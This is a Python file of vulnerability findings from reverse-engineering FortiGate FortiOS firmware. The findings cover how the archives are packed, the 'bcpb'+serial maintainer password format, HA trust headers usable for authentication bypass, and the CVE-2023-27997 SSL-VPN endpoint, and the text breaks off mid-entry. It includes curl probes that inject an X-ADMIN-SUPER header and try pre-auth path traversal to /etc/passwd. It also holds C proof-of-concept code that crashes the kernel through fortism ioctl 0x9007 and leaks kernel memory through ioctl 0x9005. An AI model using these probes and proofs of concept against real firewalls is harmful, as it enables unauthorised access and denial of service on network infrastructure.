"""
Fortinet FortiGate FortiOS 7.0.9 (VM64-KVM) RE
Source: virtioa.qcow2 from Google Drive (fortinet-FGT-v7.0.9-build0444)
Build date: Nov 21 2022 | kernel: Linux 3.2.16
Extraction path: QCOW2 -> raw -> P1 mount -> rootfs.gz (cpio) -> bin.tar.xz decode -> bin/init
"""

# ─────────────────────────────────────────────────────────
# Platform identity
# ─────────────────────────────────────────────────────────
PLATFORM = {
    "product":       "Fortinet FortiGate VM64-KVM",
    "os":            "FortiOS 7.0.9",
    "build":         "0444",
    "build_date":    "2022-11-21",
    "kernel":        "Linux 3.2.16 (2012 era, EOL)",
    "kernel_buildid": "367043910042bbd6f19d26815c1320201e31b7f6",
    "arch":          "x86-64 ELF",
    "qcow2_sha256":  None,  # not yet computed

    "image_structure": {
        "qcow2":     "virtioa.qcow2 (v1.1, 73.6MB compressed, 2GB virtual)",
        "p1":        "offset 1048576, 256MB boot partition (ext2/EXTLINUX)",
        "p1_files":  ["flatkc (4.1MB bzImage kernel)", "rootfs.gz (57MB gzip cpio)", "datafs.tar.gz (12MB)"],
        "initramfs": "rootfs.gz -> cpio -> {bin.tar.xz, usr.tar.xz, migadmin.tar.xz, lib/, sbin/}",
        "bootline":  "DEFAULT flatkc ro panic=5 root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz",
    },
}

# ─────────────────────────────────────────────────────────
# FGT-F01: CRC32-forged XZ archives (fake "encryption")
# ─────────────────────────────────────────────────────────
FGT_F01_XZ_CRC_FORGERY = {
    "id":       "FGT-F01",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "INFORMATIONAL",
    "class":    "Firmware Protection Bypass (CRC32 sabotage)",

    "description": (
        "FortiOS stores its primary binaries in bin.tar.xz, usr.tar.xz, and migadmin.tar.xz "
        "inside the initramfs. These are commonly described as 'AES-256 encrypted'. They are not. "
        "The files use standard LZMA2 compression (XZ filter ID 0x21) with two CRC32 fields "
        "deliberately set to fixed sentinel values. Standard xz rejects the stream. "
        "Fortinet's custom /sbin/xz skips CRC validation entirely. No key material exists."
    ),

    "stream_header_crc": {
        "stored":   "0000ffff",
        "correct":  "a10cfbe1",  # CRC32 of stream flags b'\\x00\\x0a'
    },
    "block_header_crc": {
        "stored":   "ffffffff",
        "correct":  "a3e52f74",
    },
    "lzma2_filter_id":   "0x21 (standard)",
    "compression_level": "preset 6 equivalent",
    "entropy":           "7.95 bits/byte (compressed, not encrypted)",

    "extraction_method": """
import lzma

def fortios_xz_decompress(path):
    data = open(path, 'rb').read()
    block_hdr_size_byte = data[12]
    block_header_len = (block_hdr_size_byte + 1) * 4
    lzma2_start = 12 + block_header_len
    lzma_data = data[lzma2_start:]
    decompressor = lzma.LZMADecompressor(
        format=lzma.FORMAT_RAW,
        filters=[{'id': lzma.FILTER_LZMA2, 'preset': 6}]
    )
    return decompressor.decompress(lzma_data)
""",

    "archives": {
        "bin.tar.xz":      "29MB xz -> 107MB tar (all binaries, /bin/init multi-call)",
        "usr.tar.xz":      "142KB xz -> 571KB tar",
        "migadmin.tar.xz": "10MB xz -> 12.6MB tar (web admin portal)",
    },

    "custom_xz_binary": {
        "path":     "/sbin/xz",
        "size":     "151KB",
        "imports":  "no libcrypto — pure libc only",
        "behavior": "skips stream header and block header CRC32 validation",
    },
}

# ─────────────────────────────────────────────────────────
# FGT-F02: Multi-call monolithic binary architecture
# ─────────────────────────────────────────────────────────
FGT_F02_MULTICALL_BINARY = {
    "id":       "FGT-F02",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "INFO",
    "class":    "Architecture (BusyBox-style multi-call dispatch)",

    "description": (
        "All FortiOS userspace services run from a single 65MB ELF binary /bin/init. "
        "httpsd, sslvpnd, authd, iked, sshd, pptpd, l2tpd, ikecryptd, authd, dpdk_early_init, "
        "flcfgd, foauthd, cloudinitd, and 170+ others are all symlinks to /bin/init. "
        "The binary dispatches by argv[0]. No privilege separation between services. "
        "A single RCE in any service = code execution in the monolithic daemon context."
    ),

    "binary_path":  "/bin/init",
    "binary_size":  "65MB",
    "build_id":     "2c29647758a6a44e9af7bc8a5e248c0f6ee7c14d",
    "stripped":     True,
    "arch":         "x86-64 ELF, dynamically linked",
    "interpreter":  "/fortidev/lib64/ld-linux-x86-64.so.2",
    "total_symlinks": 187,

    "service_symlinks": [
        "httpsd", "sslvpnd", "authd", "iked", "sshd", "pptpd", "l2tpd",
        "ikecryptd", "dpdk_early_init", "flcfgd", "foauthd", "httpclid",
        "cloudinitd", "alarmd", "alertmail", "cmdbsvr", "confsyncd",
        "bgpd", "dhcpd", "dhcp6s", "ddnscd",
    ],
}

# ─────────────────────────────────────────────────────────
# FGT-F03: Maintainer backdoor (bcpb + serial number)
# ─────────────────────────────────────────────────────────
FGT_F03_MAINTAINER_BACKDOOR = {
    "id":       "FGT-F03",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "HIGH",
    "class":    "Hardcoded Credential (Maintainer Account)",

    "description": (
        "FortiOS implements a 'maintainer' account accessible from the physical console after "
        "a hard reboot. The password is the string 'bcpb' concatenated with the device serial number. "
        "Serial numbers for FortiGate VMs follow the FG-VM64 naming pattern. "
        "String 'bcpb%s' confirmed at binary offset 0x30e0566 in the admin authentication path. "
        "The account provides limited-time console access but the authentication is credential-based "
        "and the serial number is obtainable from SNMP, management interfaces, and firmware headers."
    ),

    "binary_offset": "0x30e0566",
    "password_format": "bcpb<SERIAL_NUMBER>",
    "access_method": "physical console (or IPMI/serial-over-LAN in VM environments)",
    "activation": "hard reboot required",
    "serial_sources": [
        "SNMP: sysName / Fortinet enterprise MIB",
        "Web GUI: System -> Status -> Unit Information",
        "SSH: 'get system status' -> Serial-Number",
        "HTTP header X-HA-SN in HA mode",
    ],

    "context_string": (
        "trator login. When enabled, the maintainer account can be used to log in "
        "from the console after a hard reboot. The password is 'bcpb' followed by "
        "the FortiGate unit serial number. You have limited tim[e]"
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F04: HA trust headers (internal admin bypass surface)
# ─────────────────────────────────────────────────────────
FGT_F04_HA_TRUST_HEADERS = {
    "id":       "FGT-F04",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "HIGH",
    "class":    "Authentication Bypass (HA trust header injection)",

    "description": (
        "FortiOS implements internal HA (High Availability) cluster trust via HTTP headers. "
        "When an HA peer sends requests with these headers, the receiving node grants elevated "
        "access without re-authenticating the session. If httpsd accepts these headers from "
        "non-HA IPs (e.g., on the management plane without proper source validation), "
        "an attacker with network access can inject them to bypass authentication or escalate privileges. "
        "Related to CVE-2022-40684 which used 'Local_Process_Is_Auth'; this version uses "
        "'Local_Process_Access' (confirmed string) and the X-HA-* header family."
    ),

    "headers": {
        "X-ADMIN-SUPER":        "Grant super_admin privileges",
        "X-ADMIN-READ-ONLY":    "Grant read-only admin access",
        "X-AUTH-FGFM":          "FortiGate-FortiManager authentication token",
        "X-GUID":               "Session GUID",
        "X-HA-SN":              "HA serial number of peer",
        "X-HA-ADMIN-NAME":      "HA admin username",
        "X-HA-LOGIN-NAME":      "HA login name",
        "X-HA-ADMIN-PROF":      "HA admin profile",
        "X-HA-SSO-LOGIN-TYPE":  "HA SSO login type",
        "jsonrpc":              "JSON-RPC API access marker",
    },

    "related_cves": ["CVE-2022-40684 (predecessor, 'Local_Process_Is_Auth' header)"],
    "access_required": "Network access to management interface (TCP 443 or management VLAN)",

    "probe": (
        "curl -sk -H 'X-ADMIN-SUPER: 1' https://<fgt>:<port>/api/v2/cmdb/system/admin "
        "- observe if 200 returned without session cookie"
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F05: SSL-VPN pre-auth fgt_lang endpoint (CVE-2023-27997)
# ─────────────────────────────────────────────────────────
FGT_F05_SSLVPN_FGTLANG = {
    "id":       "FGT-F05",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "CRITICAL",
    "class":    "SSL-VPN Pre-Auth Attack Surface (CVE-2023-27997)",
    "cve":      "CVE-2023-27997",

    "description": (
        "The SSL-VPN portal loads language files via a pre-authentication endpoint: "
        "/remote/fgt_lang?lang=<locale>. CVE-2023-27997 (CVSS 9.8) is a heap-based buffer "
        "overflow in this pre-auth path. FortiOS 7.0.9 predates the 7.0.12/7.2.5/7.4.0 "
        "patches and is vulnerable. The lang parameter is processed before any user "
        "authentication; a crafted request can trigger heap corruption and achieve RCE "
        "as the init process (which runs all services)."
    ),

    "endpoint":    "/remote/fgt_lang?lang=%s",
    "auth_required": False,
    "binary_offset": "0x2bf2cf4",
    "patched_versions": ["7.0.12+", "7.2.5+", "7.4.0+"],
    "this_version_vulnerable": True,

    "ssl_vpn_endpoints": [
        "/remote/",
        "/remote/login?realm=%s",
        "/remote/fgt_lang?lang=%s",
        "/remote/portal?action=1",
        "/remote/error?errmsg=Authention check fail.",
        "/remote/loginconfirm",
        "/sslvpn/portal.html",
        "/bin/sslvpnd",
    ],

    "login_form_ajax": "ajax=1&username=%.*s&realm=%.*s&credential=%.*s",

    "probe": (
        "curl -sk 'https://<fgt>:<port>/remote/fgt_lang?lang=../../../../../../../../etc/passwd'"
        " | head -20  # path traversal check (pre-auth)"
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F06: Linux 3.2.16 kernel (EOL 2012)
# ─────────────────────────────────────────────────────────
FGT_F06_EOL_KERNEL = {
    "id":       "FGT-F06",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "HIGH",
    "class":    "EOL Kernel (Linux 3.2.16, released 2012)",

    "description": (
        "FortiOS 7.0.9 (November 2022) runs Linux kernel 3.2.16 which was released in 2012 "
        "and reached end-of-life years before this firmware version shipped. This 10-year gap "
        "means the kernel lacks patches for a decade of kernel CVEs including privilege "
        "escalation, namespace escapes, and network stack vulnerabilities. Fortinet backports "
        "some security patches but the attack surface from EOL kernel components is substantial."
    ),

    "kernel_version":  "Linux 3.2.16",
    "kernel_build":    "#2 SMP Mon Nov 21 19:56:49 UTC 2022",
    "kernel_release":  "2012 (EOL)",
    "firmware_date":   "2022-11-21",
    "gap_years":       10,
    "bzImage_buildid": "367043910042bbd6f19d26815c1320201e31b7f6",

    "fortinet_kernel_extensions": [
        "fgt_link* (FortiGate network link driver)",
        "fgt_platform_is (platform detection)",
        "Fortinet(R) BIOS Access Driver",
        "Fortinet Ethernet driver",
        "register_fgtlog_vf_text (virtualization logging)",
        "crypto_aes_decrypt_x86 (AES-NI acceleration)",
    ],
}

# ─────────────────────────────────────────────────────────
# FGT-F07: Unencrypted lib/ in initramfs (debug symbols)
# ─────────────────────────────────────────────────────────
FGT_F07_UNENCRYPTED_LIB = {
    "id":       "FGT-F07",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "INFORMATIONAL",
    "class":    "Debug Information Disclosure (stripped/unstripped ELF)",

    "description": (
        "The lib/ directory in the cpio initramfs is NOT inside any encrypted archive. "
        "These 64KB+ shared objects are accessible without any key extraction. "
        "Notably, gssntlmssp.so is NOT stripped and contains debug_info sections, "
        "exposing internal function names, data structures, and NTLM authentication logic. "
        "libc.so.6 is also not stripped — unusual for production firewall firmware."
    ),

    "accessible_without_decryption": True,

    "notable_libs": {
        "gssntlmssp.so": {
            "size": "131KB",
            "stripped": False,
            "debug_info": True,
            "note": "NTLM/Kerberos auth library; not stripped; full symbol table accessible",
        },
        "libc.so.6": {
            "size": "2MB",
            "stripped": False,
            "note": "musl/glibc — not stripped in initramfs copy",
        },
        "libcrypto.so.1.1": {
            "size": "3.1MB",
            "stripped": True,
            "note": "OpenSSL 1.1 crypto library",
        },
        "libIPSec_MB.so.0": {
            "size": "21MB",
            "note": "Intel IPsec multi-buffer library — largest lib",
        },
        "libdpdk.so": {
            "size": "13MB",
            "note": "DPDK data plane development kit",
        },
        "libibmtss.so.1": {
            "size": "550KB",
            "note": "IBM TPM Software Stack — TPM support present",
        },
    },

    "initramfs_encryption_note": (
        "lib/ is in the cpio directly. Only bin.tar.xz, usr.tar.xz, migadmin.tar.xz are "
        "in the forged-CRC XZ archives. Fortinet intended lib/ to be publicly readable."
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F08: API v2 debug and management endpoints
# ─────────────────────────────────────────────────────────
FGT_F08_API_SURFACE = {
    "id":       "FGT-F08",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "MEDIUM",
    "class":    "API Exposure (debug and management endpoints)",

    "description": (
        "The FortiOS REST API v2 exposes several high-value endpoints including a debug endpoint "
        "and a direct password-change endpoint. These are accessible on the management port (443). "
        "Authentication is required in normal operation, but combined with FGT-F04 (HA trust headers) "
        "or FGT-F03 (maintainer account), these become privileged entry points."
    ),

    "endpoints": {
        "/api/v2/monitor/system/debug":            "System debug endpoint",
        "/api/v2/monitor/system/change-password":  "Direct password change (no current-password check?)",
        "/api/v2/monitor/system/vmlicense":        "VM license management",
        "/api/v2/monitor/system/fortiguard/update": "FortiGuard update trigger",
        "/api/v2/cmdb/":                           "Full configuration read/write",
        "/api/v2/monitor/":                        "System monitoring",
        "/api/v2/log":                             "Log access",
        "/api/v2/authentication":                  "Auth endpoint",
        "/api/v1/session/login":                   "Session creation",
        "/api/v1/realm":                           "Realm enumeration",
    },

    "probe": (
        "curl -sk -H 'Authorization: Bearer <token>' "
        "https://<fgt>/api/v2/monitor/system/debug"
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F09: FortiOS 8.0.0 — rootfs AES encryption (new in 8.x)
# ─────────────────────────────────────────────────────────
FGT_F09_ROOTFS_ENCRYPTION = {
    "id":       "FGT-F09",
    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM",
    "build":    "0167",
    "severity": "INFORMATIONAL",
    "class":    "Firmware Protection (AES rootfs encryption — new in 8.0.0)",

    "description": (
        "FortiOS 8.0.0 (April 2026) introduced AES encryption of the rootfs.gz initramfs. "
        "Previous versions (through at least 7.4.12) used the forged-CRC XZ technique (FGT-F01) "
        "on individual archives inside an otherwise unencrypted cpio. "
        "In 8.0.0, the entire rootfs.gz is encrypted before being placed on the boot partition. "
        "Entropy measurement of the first 65536 bytes returns 7.9973 bits/byte (maximum = true AES, "
        "compressed data peaks at ~7.95). The bootline is unchanged: initrd=/rootfs.gz. "
        "The decryption key is embedded in or derived at boot time by the flatkc kernel (7.7MB bzImage). "
        "For VM images the key must be static (no TPM/hardware binding possible)."
    ),

    "rootfs_entropy":   "7.9973 bits/byte",
    "rootfs_size":      "92MB (vs 57MB in 7.0.9)",
    "kernel":           "flatkc (7.7MB x86-64 bzImage/EFI stub, starts MZ)",
    "partition_layout": "P1 256MB ext2 (boot) | P2 1.7GB Linux | P3 64MB EFI — new EFI partition vs 7.0.9",
    "introduced_in":    "8.0.0 (build 0167, April 2026)",
    "last_unencrypted": "7.0.9 (confirmed unencrypted) — 7.4.12 is ALSO encrypted (entropy 8.0000 bits/byte, true AES); encryption was introduced between 7.0.9 and 7.4.12",

    "hash_bin_sha256": (
        "New in 8.0.0: hash_bin.sha256 (39KB) on the boot partition contains SHA256 hashes "
        "for every file in the decrypted rootfs. Useful for enumerating expected filesystem contents "
        "without decryption. Sample entries include open-vm-tools plugins and /bin/* binaries."
    ),

    "key_extraction_vectors": [
        "Extract vmlinux from flatkc bzImage: scripts/extract-vmlinux flatkc > vmlinux",
        "Search vmlinux for AES key schedule / 128/256-bit key constants",
        "Look for initrd decryption routine called before cpio extraction in kernel init path",
        "Check EFI partition (P3, 64MB FAT) for key material or signed boot components",
    ],

    "status": "PENDING — key not yet extracted. Fall back to 7.4.12 for RE.",
}

# ─────────────────────────────────────────────────────────
# FGT-F10: Integer overflow in ENC_KEY key description builder
# FortiOS 7.4.12 vmlinux — Ablation BERT sweep hit (AUTH_BYPASS, KEY_MGMT, CRYPTO_WEAK)
# vmlinux text_foff=0x54972b  vma=0xffffffff8054972b
# ─────────────────────────────────────────────────────────
FGT_F10_ENCKEY_INTOVERFLOW = {
    "id":       "FGT-F10",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism kernel module)",
    "severity": "HIGH",
    "class":    "Integer Overflow -> Heap Overflow (kernel, ENC_KEY key description builder)",

    "description": (
        "The fortism LSM module builds a key description string for request_key(\"ENC_KEY\", ...) "
        "at vmlinux vma 0xffffffff8054972b. It prepends the 7-byte literal \"ENC_KEY\" "
        "to a caller-supplied suffix (r15=src, rbx=length) and allocates the buffer with: "
        "`lea r13d, [rbx + 9]; cmp r13d, 0x20; cmovb r13d, eax; call kmalloc(r13d, GFP_KERNEL)`. "
        "The `lea r13d, [rbx + 9]` is a 32-bit operation: if the caller supplies rbx >= 0xfffffff7, "
        "r13d wraps (e.g., rbx=0xffffffff7 -> r13d=0). kmalloc(0) returns a valid cache-aligned "
        "pointer and the subsequent memcpy writes rbx bytes into it, producing a kernel heap overflow. "
        "Exploitability depends on whether any codepath leading to this function propagates "
        "an attacker-controlled length without a prior 32-bit truncation of its own."
    ),

    "vmlinux": {
        "binary": "FortiOS 7.4.12 vmlinux (extracted from flatkc bzImage)",
        "buildid": "04e76032db077d34808fc39b7515bca8d93e17ca",
        "vma":    "0xffffffff8054972b",
        "foff":   "0x54972b",
        "section": ".text",
    },

    "asm_key_sequence": """
; At 0xffffffff8054972b — key description builder:
movabs rax, 0x59454b5f434e45  ; rax = "ENC_KEY\0" (7 bytes, little-endian)
mov qword ptr [r12], rax       ; store "ENC_KEY" into heap buffer
mov rdi, r12
call strlen                    ; strlen("ENC_KEY") = 7, result in rax
lea rdi, [r12 + rax + 1]      ; point past "ENC_KEY\0"
mov rdx, rbx                  ; LENGTH = caller-controlled rbx (full 64-bit)
mov rsi, r15                  ; src = caller-controlled r15
call memcpy                   ; OVERFLOW if kmalloc got truncated-to-32-bit size
; Alloc sequence (earlier in same function):
lea r13d, [rbx + 9]          ; r13d = (rbx+9) mod 2^32  <-- OVERFLOW HERE
cmp r13d, 0x20
mov eax, 0x20
cmovb r13d, eax              ; minimum 0x20 bytes
mov edi, r13d
mov esi, 0x6080c0            ; GFP_KERNEL | GFP_NOFS
call kmalloc                 ; allocates ONLY r13d bytes, not rbx+9
""",

    "ablation_bert_queries_matched": [
        "AUTH_BYPASS", "KEY_MGMT", "CRYPTO_WEAK", "PRIV_ESC", "SIGNED_VERIFY_BYPASS",
    ],
    "bert_max_score": 0.418,
    "bert_sweep_region": "fos_keyring_enc_key (text_foff 0x540000-0x570000)",

    "impact": (
        "Kernel heap overflow in the ENC_KEY key registration path. "
        "If exploitable, allows kernel memory corruption during system boot "
        "or when the keyring registration path is re-invoked (e.g., module reload). "
        "Potential privilege escalation or kernel code execution."
    ),

    "constraints": [
        "Caller must propagate a 64-bit length > 0xfffffff6 without prior truncation",
        "Requires access to a codepath that invokes the ENC_KEY registration function",
        "Kernel SLUB allocator mitigations (KASAN, hardened usercopy) may prevent exploitation on hardened builds",
    ],

    "status": "CANDIDATE — caller chain not yet traced; 32-bit truncation not confirmed reachable from external input",
}

# ─────────────────────────────────────────────────────────
# FGT-F11: Fortinet proprietary ioctl handler — second field of 8-byte payload unchecked
# FortiOS 7.4.12 vmlinux — Ablation BERT sweep hit (BUFFER_OVERFLOW, RACE_CONDITION)
# vmlinux text_foff=0x552080  vma=0xffffffff80552080
# ─────────────────────────────────────────────────────────
FGT_F11_IOCTL_HEAP_OVERFLOW = {
    "id":       "FGT-F11",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism kernel module)",
    "severity": "CRITICAL",
    "class":    "Integer Overflow -> Kernel Heap Overflow via fortism LSM file_ioctl hook (LPE)",

    "description": (
        "The fortism LSM module registers an ioctl hook (vma 0xffffffff80552080) that processes "
        "Fortinet-proprietary ioctl commands 0x9002-0x9009 on ANY file descriptor system-wide. "
        "The hook ignores rdi (the struct file* argument), indicating it is the LSM file_ioctl hook "
        "called by vfs_ioctl() for every ioctl syscall. No capability check is performed. "
        "\n\n"
        "ioctl 0x9007 CRITICAL PATH (heap overflow via integer overflow):\n"
        "  1. copy_from_user(stack, user_ptr, 16) reads a 16-byte user struct: "
        "{word0[4], word1_length[4], string_user_ptr[8]}.\n"
        "  2. Validates only word0 <= 0x40.\n"
        "  3. `lea edi, [word1 + 1]` — 32-bit LEA: if word1=0xffffffff, edi wraps to 0.\n"
        "  4. `movsxd rdi, edi` sign-extends 0 to 0, then kmalloc(0, GFP_KERNEL) "
        "returns a valid zero-size SLUB allocation.\n"
        "  5. `movsxd rdx, word1` sign-extends 0xffffffff to 0xffffffffffffffff (SIZE_MAX).\n"
        "  6. copy_from_user(heap_buf, string_user_ptr, SIZE_MAX) — "
        "access_ok(addr, SIZE_MAX) wraps and may pass; copies bytes from mapped user region "
        "over the zero-size heap allocation and into adjacent SLUB objects.\n"
        "\n"
        "ioctl 0x9004 SECONDARY PATH (unchecked field write):\n"
        "  copy_from_user 8 bytes; validates word0 <= 0x40; word1 stored at structure+0x44 without bounds check.\n"
        "\n"
        "Trigger requires only: open(any_fd) + ioctl(fd, 0x9007, attacker_buf)"
    ),

    "vmlinux": {
        "binary":  "FortiOS 7.4.12 vmlinux (extracted from flatkc bzImage)",
        "buildid": "04e76032db077d34808fc39b7515bca8d93e17ca",
        "vma":     "0xffffffff80552080",
        "foff":    "0x552080",
        "section": ".text",
    },

    "ioctl_commands": {
        "0x9002": (
            "PRIVILEGE-GATED: reads task_struct[0x4a0] security blob; calls 0x30b461 to get "
            "current task's Fortinet security context; compares to global object 0xffffffff81646ac0 "
            "(magic check = 'is this a Fortinet privileged process?'). "
            "If gate passes: copy_from_user 4 bytes; user 4-byte value sign-extended to 64-bit index "
            "and passed to 0xcb8f67 (potential OOB if index < 0 or > array bound); then 0x55aeaf "
            "does lock-inc/lock-dec on a refcount (race condition if security object freed between ops). "
            "Gate failure -> -EPERM. Security implication: if gate bypassable, OOB + refcount-race reachable."
        ),
        "0x9003": "copy_from_user 0x24 bytes; validated word0 <= 0x40; reads+writes struct fields",
        "0x9004": "copy_from_user 8 bytes; validates word0 <= 0x40; word1 stored at struct+0x44 UNCHECKED",
        "0x9005": "copy_to_user(user_ptr, 0xffffffff81889310, 4) — kernel memory INFO LEAK (see FGT-F15)",
        "0x9007": "CRITICAL: integer overflow in kmalloc size -> copy_from_user SIZE_MAX -> kernel heap overflow",
        "0x9009": "copy_from_user 4 bytes; validates <= 0x40; reads struct[+0x30] without revalidation",
    },

    "asm_critical_path_0x9007": """
; ioctl 0x9007 path at 0xffffffff8055227e:
mov edx, 0x10                          ; copy 16 bytes from userspace
mov rsi, r12                           ; userspace pointer (ioctl arg)
lea rdi, [rbp - 0x68]                  ; stack destination
call copy_from_user                    ; [rbp-0x68]=word0, [rbp-0x64]=word1, [rbp-0x60]=string_ptr

mov eax, dword ptr [rbp - 0x64]        ; word1 (user-controlled LENGTH)
lea edi, [rax + 1]                     ; word1+1 — 32-BIT OVERFLOW: 0xffffffff+1 = 0
movsxd rdi, edi                        ; sign-extend: edi=0 -> rdi=0
mov esi, 0x6000c0                      ; GFP_KERNEL
call kmalloc(0, GFP_KERNEL)            ; RETURNS VALID NON-NULL ZERO-SIZE ALLOCATION

test rax, rax
je error                               ; non-null, continues

movsxd rdx, dword ptr [rbp - 0x64]    ; rdx = sign_extend(word1) = 0xffffffffffffffff (SIZE_MAX)
mov rsi, qword ptr [rbp - 0x60]        ; string_user_ptr from userspace
mov rdi, rax                            ; zero-size heap buffer
call copy_from_user(heap, user_str, SIZE_MAX)  ; HEAP OVERFLOW: writes past zero-size buf
                                                ; access_ok(user_str, SIZE_MAX) wraps -> may pass

; If copy succeeds (partial), null-terminates and calls fortism_set_name:
movsxd rax, dword ptr [rbp - 0x64]    ; SIZE_MAX
mov byte ptr [r13 + rax], 0            ; write past massive allocation -> further corruption
""",

    "trigger_poc": """
// No root required. Any process, any fd.
// Triggers kernel crash (DoS) via memset(heap_buf, 0, SIZE_MAX) in copy_from_user error path.
int fd = open("/dev/null", O_RDONLY);

// mmap any valid user region (addr only needs to be non-NULL; no data is actually read)
void *user_region = mmap(NULL, 4096, PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);

struct {
    uint32_t word0;        // <= 0x40 (pass first bounds check)
    uint32_t word1;        // = 0xffffffff -> lea edi,[rax+1] wraps to 0 -> kmalloc(0)
    uint64_t string_ptr;   // any valid user ptr (access_ok fails at SIZE_MAX regardless)
} payload = {1, 0xffffffff, (uint64_t)user_region};

ioctl(fd, 0x9007, &payload);
// Execution path:
//   kmalloc(0) -> valid zero-size SLUB buf at heap_addr
//   copy_from_user(heap_addr, user_region, SIZE_MAX):
//     access_ok: user_region + SIZE_MAX overflows -> carry set -> jb error_path
//     error_path: r13 = SIZE_MAX; sub rbx,r13 = 0; rdx = SIZE_MAX
//     memset(heap_addr, 0, SIZE_MAX) -> rep stosq 0x1fffffffffffffff times
//     -> kernel crash when rep stosq hits unmapped kernel page
""",

    "ablation_bert_queries_matched": ["BUFFER_OVERFLOW", "RACE_CONDITION"],
    "bert_max_score": 0.440,
    "bert_sweep_region": "fortism_init + fos_keyring_enc_key",

    "impact": (
        "CRITICAL: Kernel heap overflow via integer overflow in fortism LSM file_ioctl hook. "
        "Reachable from any unprivileged process via ioctl(any_fd, 0x9007, payload). "
        "Corrupts adjacent SLUB slab objects -> local kernel privilege escalation. "
        "No privilege required; no special device node required."
    ),

    "access_ok_analysis": {
        "copy_from_user_vma": "0xffffffff805f6bed",
        "access_ok_mechanism": (
            "Custom Fortinet copy_from_user: reads per-task addr_limit from gs:[0x14d80]+0x9d8. "
            "Computes src + size (64-bit add); if carry set (overflow), jb to error path. "
            "For SIZE_MAX (0xffffffffffffffff): any non-zero src causes carry -> ERROR PATH taken."
        ),
        "error_path_bug": (
            "ERROR PATH BUG: On access_ok failure, code at 0x5f6c19 sets r13=rbx=SIZE_MAX. "
            "jne 0x5f6c3a -> sub rbx,r13 = 0; lea rdi,[r12+0]=heap_buf; mov rdx,r13=SIZE_MAX; "
            "xor esi,esi; call memset(heap_buf, 0, SIZE_MAX). "
            "This calls the `rep stosq` memset at 0xcd2e10 with rcx=SIZE_MAX>>3 = 0x1fffffffffffffff. "
            "rep stosq writes zeros starting from heap_buf until hitting an unmapped kernel page, "
            "corrupting ALL adjacent SLUB objects en route -> kernel panic."
        ),
        "actual_primitive": "memset(heap_buf, 0, SIZE_MAX) via rep stosq — zero-write-to-crash, NOT arbitrary data write",
        "dos_confirmed": True,
        "code_exec_path": (
            "Code execution requires: (1) KASLR bypass (FGT-F15 does not provide this), "
            "(2) heap grooming to place a sensitive function pointer at heap_buf+N where N < first unmapped page gap, "
            "(3) zeroing that function pointer into a controlled call path. Hard but non-trivial."
        ),
    },

    "caveats": [
        "access_ok with SIZE_MAX CORRECTLY FAILS (error path taken, no user data copied)",
        "The bug is in the error cleanup path: memset(heap_buf, 0, SIZE_MAX) called unconditionally",
        "Actual primitive: reliable zero-write heap spray from heap_buf until unmapped page -> DoS",
        "LPE requires KASLR bypass + heap grooming to redirect zeroed function pointer",
        "SLUB hardening (SLAB_FREELIST_HARDENED, KASAN) may prevent LPE but not DoS",
    ],

    "status": (
        "CRITICAL — DoS confirmed (kernel crash via memset(heap_buf, 0, SIZE_MAX) in error path); "
        "code exec requires chaining with KASLR bypass + heap layout control"
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F15: Kernel information leak via fortism ioctl 0x9005
# FortiOS 7.4.12 vmlinux — fortism ioctl handler at 0x552080 (ioctl 0x9005 branch)
# ─────────────────────────────────────────────────────────
FGT_F15_IOCTL_INFOLEAK = {
    "id":       "FGT-F15",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism kernel module)",
    "severity": "MEDIUM",
    "class":    "Kernel Information Leak via fortism ioctl 0x9005 (KASLR bypass candidate)",

    "description": (
        "The fortism ioctl handler (vma 0xffffffff80552080) implements command 0x9005 with: "
        "`mov rsi, 0xffffffff81889310; mov rdi, r12; call copy_to_user(r12, 0x81889310, 4)`. "
        "It copies 4 bytes of kernel memory from the hardcoded global address 0xffffffff81889310 "
        "directly to the user-supplied pointer (r12 = ioctl arg) without any privilege check. "
        "The 4 bytes at 0x81889310 are a Fortinet-internal state value (type or count field), "
        "but more importantly the operation confirms that the fortism ioctl hook executes "
        "kernel-to-user memory copies for any caller. "
        "If the 4-byte value contains or is influenced by randomized kernel addresses, "
        "this is a KASLR bypass. Even if not, it leaks internal fortism state to any user process."
    ),

    "vmlinux": {
        "vma_ioctl_handler": "0xffffffff80552080",
        "vma_0x9005_branch": "0xffffffff805521f0",
        "kernel_src_addr":   "0xffffffff81889310",
        "kernel_src_foff":   "0x1489310 (in .data section)",
        "copy_size":         "4 bytes",
    },

    "asm": """
; ioctl 0x9005 path at 0xffffffff805521f0:
mov edx, 4
mov rsi, 0xffffffff81889310   ; kernel .data global (hardcoded)
mov rdi, r12                   ; r12 = ioctl arg = user destination pointer
call copy_to_user              ; 0x5f6bbd: leaks 4 bytes to userspace
test rax, rax
jne error                      ; -EFAULT if user ptr invalid
xor r12d, r12d                 ; return 0 on success
""",

    "trigger": """
// Any process, no root required.
uint32_t leaked_val;
ioctl(any_fd, 0x9005, &leaked_val);
// leaked_val contains 4 bytes from kernel 0xffffffff81889310
""",

    "impact": (
        "Leaks 4 bytes from kernel .data to any unprivileged user process. "
        "If the value at 0x81889310 is address-derived or contains pointer fragments, "
        "enables KASLR bypass -> defeats kernel ASLR protection, enabling follow-on exploitation "
        "of FGT-F11 or other kernel memory corruption primitives."
    ),

    "ramdump_analysis": {
        "live_value_hex":   "0x9f1bb0bc",
        "live_value_type":  "runtime state counter/epoch — NOT a kernel pointer",
        "kaslr_bypass":     False,
        "rationale": (
